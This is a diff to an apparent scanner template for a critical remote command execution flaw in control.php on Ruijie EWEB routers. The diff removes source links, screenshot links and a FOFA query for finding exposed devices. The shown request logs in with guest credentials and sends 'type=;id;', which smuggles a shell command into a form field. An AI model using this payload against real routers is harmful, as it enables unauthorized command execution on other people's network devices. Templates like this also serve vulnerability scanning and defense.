@@ -3,12 +3,8 @@ info:
   name: 锐捷EWEB路由器control.php存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kdt4q8k804fi1n0i'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kdt4q8k804fi1n0i
-    fofa: title="锐捷网络-EWEB网管系统"
 http:
 - raw:
   - 'POST /ddi/server/login.php HTTP/1.1
@@ -20,7 +16,6 @@ http:
 
     username=guest&password=guest?
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575330215-126056c7-3f31-4657-9ad5-1b7782de7d41.png)
 
     利用可用cookie访问接口'
   redirects: false
@@ -46,9 +41,7 @@ http:
     Connection: keep-alive
 
 
-    type=;id;
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575330393-a535533f-7765-45cd-82fd-ad488ab6c704.png)'
+    type=;id;'
   redirects: false
   matchers:
   - status:
